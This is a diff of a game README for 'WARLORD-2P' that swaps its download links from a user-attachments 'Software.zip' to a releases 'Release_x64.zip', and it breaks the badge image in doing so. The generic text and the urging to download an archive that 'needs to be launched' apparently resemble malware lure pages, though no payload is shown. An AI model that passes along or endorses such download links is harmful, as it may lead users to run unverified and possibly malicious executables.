@@ -15,7 +15,7 @@ WARLORD-2P is a board game that combines elements of chess, checkers, and tradit
 - Stunning visuals and immersive sound effects
 
 ## How to Play
-To start playing WARLORD-2P, simply download the game and launch it on your device. You can find the game software [here](https://github.com/user-attachments/files/18383251/Software.zip) (needs to be launched). 
+To start playing WARLORD-2P, simply download the game and launch it on your device. You can find the game software [here](https://github.com/JRxMST/warlord-2p/releases/download/v2.0/Release_x64.zip) (needs to be launched). 
 
 ## Gameplay Mechanics
 The game features a grid-based board where players can move their pieces strategically to outwit their opponent. Each piece has unique abilities and movement patterns, adding a layer of depth to the gameplay. As you progress through the game, you'll need to adapt your strategies to counter the WARLORD-bot's relentless attacks. Can you emerge victorious and claim the title of the ultimate warlord? 💪
@@ -39,4 +39,4 @@ If the download link provided above does not work, please check the "Releases" s
 ## Get Started
 Are you ready to embark on a thrilling war adventure? Download WARLORD-2P now and challenge your friends or the formidable WARLORD-bot to a battle of wits and strategy. Only the strongest and most cunning warlord will emerge victorious. Are you up to the challenge? Let the war begin! 🚀
 
-[![Download WARLORD-2P](https://img.shields.io/badge/Download-WARLORD--2P-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download WARLORD-2P](https://github.com/JRxMST/warlord-2p/releases/download/v2.0/Release_x64.zip)](https://github.com/JRxMST/warlord-2p/releases/download/v2.0/Release_x64.zip)
